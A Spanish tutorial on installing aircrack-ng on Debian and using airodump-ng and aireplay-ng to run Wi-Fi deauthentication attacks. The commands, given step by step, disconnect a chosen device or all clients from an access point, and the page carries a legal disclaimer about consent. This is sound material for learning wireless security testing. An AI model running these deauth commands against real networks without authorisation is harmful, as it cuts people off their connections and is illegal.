# Tutorial: Instalación de Airmon-ng y Ataque de Deauth en Debian

## Introducción

Este tutorial te guiará a través de la instalación de `airmon-ng` y otras herramientas relacionadas en una máquina Debian. También aprenderás cómo realizar un ataque de deautenticación (deauth) a un punto de acceso (AP) y un dispositivo específico.

## Advertencia Legal

El uso de estas herramientas para realizar un ataque de deauth en una red o dispositivo sin el consentimiento expreso del propietario es ilegal y puede tener graves consecuencias legales. Este tutorial se proporciona únicamente con fines educativos. El autor no se hace responsable del uso indebido de la información proporcionada.

## Requisitos Previos

- Una máquina con Debian o derivada.
- Acceso de superusuario (root) o permisos `sudo`.
- Una tarjeta de red Wi-Fi compatible con el modo monitor.

## Instalación de Airmon-ng y Herramientas Relacionadas

### Paso 1: Actualizar los Repositorios

Primero, actualiza los repositorios de tu sistema:

```bash
sudo apt update
```

### Paso 2: Instalar Aircrack-ng

`airmon-ng` es parte del paquete `aircrack-ng`, así que instalaremos el paquete completo:

```bash
sudo apt install aircrack-ng
```

### Paso 3: Verificar la Instalación

Verifica que `airmon-ng` y las herramientas relacionadas se hayan instalado correctamente:

```bash
airmon-ng --help
```

Si ves la información de ayuda, la instalación se ha realizado con éxito.

## Habilitar el Modo Monitor

### Paso 1: Identificar tu Interfaz Wi-Fi

Primero, identifica tu interfaz Wi-Fi:

```bash
sudo airmon-ng
```

Esto te dará una lista de las interfaces disponibles. Supongamos que la interfaz es `wlan0`.

### Paso 2: Habilitar el Modo Monitor

Habilita el modo monitor en tu interfaz Wi-Fi:

```bash
sudo airmon-ng start wlan0
```

Esto cambiará la interfaz a `wlan0mon` o similar.

### Paso 3: Verificar el Modo Monitor

Verifica que el modo monitor esté activado:

```bash
sudo iwconfig
```

## Ataque de Deautenticación

### Paso 1: Escanear las Redes Wi-Fi Disponibles

Escanea las redes Wi-Fi para identificar el punto de acceso (AP) y el dispositivo objetivo:

```bash
sudo airodump-ng wlan0mon
```

Esto mostrará una lista de APs y dispositivos conectados. Anota el BSSID del AP y el número de canal (CH) al que está conectado el dispositivo.

### Paso 2: Enfocar el Escaneo en un AP

Para enfocarte en un AP específico y sus dispositivos conectados, usa:

```bash
sudo airodump-ng --bssid <BSSID_DEL_AP> --channel <CANAL> wlan0mon
```

Mantén esta ventana abierta para ver los dispositivos conectados al AP.

### Paso 3: Realizar el Ataque de Deauth

Para desconectar un dispositivo específico del AP:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID_DEL_AP> -c <MAC_DEL_DISPOSITIVO> wlan0mon
```

- `--deauth 10`: Envía 10 paquetes de deauth.
- `-a <BSSID_DEL_AP>`: Especifica el BSSID del AP.
- `-c <MAC_DEL_DISPOSITIVO>`: Especifica la dirección MAC del dispositivo objetivo.

Para desconectar todos los dispositivos del AP:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID_DEL_AP> wlan0mon
```

## Deshabilitar el Modo Monitor

Cuando hayas terminado, desactiva el modo monitor y vuelve al modo gestionado:

```bash
sudo airmon-ng stop wlan0mon
```

Esto devolverá tu interfaz Wi-Fi al modo normal.

## Conclusión

Has aprendido cómo instalar `airmon-ng` y realizar un ataque de deauth en un AP y un dispositivo específico en una máquina Debian. Recuerda siempre actuar dentro de los límites de la ley y usar este conocimiento de manera ética.
